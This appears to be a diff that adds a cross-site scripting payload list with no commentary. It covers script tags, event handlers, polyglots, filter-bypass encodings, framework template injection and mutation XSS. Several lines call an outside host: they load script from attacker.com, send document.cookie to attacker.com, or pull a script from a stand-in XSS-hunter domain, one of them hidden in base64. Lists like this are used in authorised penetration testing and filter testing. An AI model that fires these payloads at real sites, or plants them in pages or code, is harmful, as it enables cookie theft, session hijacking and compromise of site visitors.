@@ -1,0 +1,146 @@
+
+# ------------------------------------------------------------------------------------------------
+# BASIC PAYLOADS
+# ------------------------------------------------------------------------------------------------
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
+<script>alert(window.location)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>setTimeout(function(){alert(1)},100)</script>
+<script>/* */alert(1)//</script>
+<script src="http://attacker.com/xss.js"></script>
+<script/src="http://attacker.com/xss.js"></script>
+
+# ------------------------------------------------------------------------------------------------
+# EVENT HANDLERS (HTML5 & LEGACY)
+# ------------------------------------------------------------------------------------------------
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=1 href=1 onerror="javascript:alert(1)">
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe onload=alert(1)></iframe>
+<input type="text" onfocus="alert(1)" autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<select onchange=alert(1)><option>1</option><option>2</option></select>
+<textarea oninput=alert(1)></textarea>
+<form onsubmit=alert(1)><button>Submit</button></form>
+<a href="javascript:alert(1)">Click me</a>
+<a onmouseover=alert(1)>Hover me</a>
+<button onclick=alert(1)>Click me</button>
+<details ontoggle=alert(1)>Toggle me</details>
+<video src=x onerror=alert(1)></video>
+<audio src=x onerror=alert(1)></audio>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<isindex type=image src=1 onerror=alert(1)>
+<marquee onstart=alert(1)>
+<object onerror=alert(1)>
+<embed src=javascript:alert(1)>
+<div onpointerover="alert(1)">PointerOver</div>
+<div onpointerenter="alert(1)">PointerEnter</div>
+<div onpointerleave="alert(1)">PointerLeave</div>
+
+# ------------------------------------------------------------------------------------------------
+# POLYGLOTS (BREAK OUT OF CONTEXTS)
+# ------------------------------------------------------------------------------------------------
+javascript://%250Aalert(1)//
+" onmouseover=alert(1) //
+'>"><script>alert(1)</script>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+" ' type=image src=1 onerror=alert(1)
+'"><svg/onload=alert(1)>
+//"--></script><script>alert(1)</script>
+" autofocus onfocus=alert(1) style="
+%00"><script>alert(1)</script>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<script>/*<![CDATA[*/alert(1)/*]]>*/</script>
+
+# ------------------------------------------------------------------------------------------------
+# WAF BYPASS & OBFUSCATION
+# ------------------------------------------------------------------------------------------------
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\x3cscript\x3ealert(1)\x3c/script\x3e
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+&lpar;alert&rpar;(1)
+<a href="&#106;avascript:alert(1)">Click</a>
+<a href="javascript&colon;alert(1)">Click</a>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=Function("ale"+"rt(1)")()>
+<img src=x onerror=this['al'+'ert'](1)>
+<script> (0,eval)('alert(1)') </script>
+<svg/onload=try{window.x?0:!function(){var x=new XMLHttpRequest;x.open('GET','//attacker.com/?c='+document.cookie),x.send()}()}catch(e){}>
+<script>%00alert(1)</script>
+<ScRiPt>alert(1)</sCrIpT>
+<scr<script>ipt>alert(1)</script>
+<img src = x onerror = alert(1)>
+<img src=x onerror=alert(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1) 
+
+# ------------------------------------------------------------------------------------------------
+# FRAMEWORK INJECTION (ANGULAR, VUE, REACT, SVELTE)
+# ------------------------------------------------------------------------------------------------
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+<div ng-app ng-csp>{{x=1;x.toString.constructor('alert(1)')()}}</div>
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+<input ng-focus=$event.view.alert(1)>
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<div :class="alert(1)"></div>
+<a :href="'javascript:alert(1)'">Click me</a>
+<template v-if="alert(1)"></template>
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
+<script>$(function(){$('#element').html('<img src=x onerror=alert(1)>');})</script>
+{@html "<img src=x onerror=alert(1)>"}
+
+# ------------------------------------------------------------------------------------------------
+# M-XSS (MUTATION XSS)
+# ------------------------------------------------------------------------------------------------
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)></style></mglyph></form></form>
+<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
+
+# ------------------------------------------------------------------------------------------------
+# BLIND XSS & DATA EXFILTRATION
+# ------------------------------------------------------------------------------------------------
+<script src=//YourXSSHunterDomain></script>
+"><script src=//YourXSSHunterDomain></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'//YourXSSHunterDomain\';document.body.appendChild(a)')
+<img src=x id=dmfy onmouseover=alert(1) onerror=eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9Jy8vWW91clhTU0h1bnRlckRvbWFpbic7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKQ=='))>
+
+# ------------------------------------------------------------------------------------------------
+# OBSCURE TAGS & ATTRIBUTES
+# ------------------------------------------------------------------------------------------------
+<d3v class="abc" onclick="alert(1)">Click me</d3v>
+<button formaction=javascript:alert(1)>Click me</button>
+<input type="submit" formaction=javascript:alert(1)>
+<form><button formaction="javascript:alert(1)">XSS</button></form>
+<a href="javascript:alert(1)" id="xss"></a>
+<math href="javascript:alert(1)">Click me</math>
+<animate onbegin=alert(1) attributeName=x dur=1s>
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<input onauxclick=alert(1)>
+
+# ------------------------------------------------------------------------------------------------
+# FILE UPLOAD & SVG
+# ------------------------------------------------------------------------------------------------
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+<script type="text/javascript">
+alert("XSS");
+</script>
+</svg>
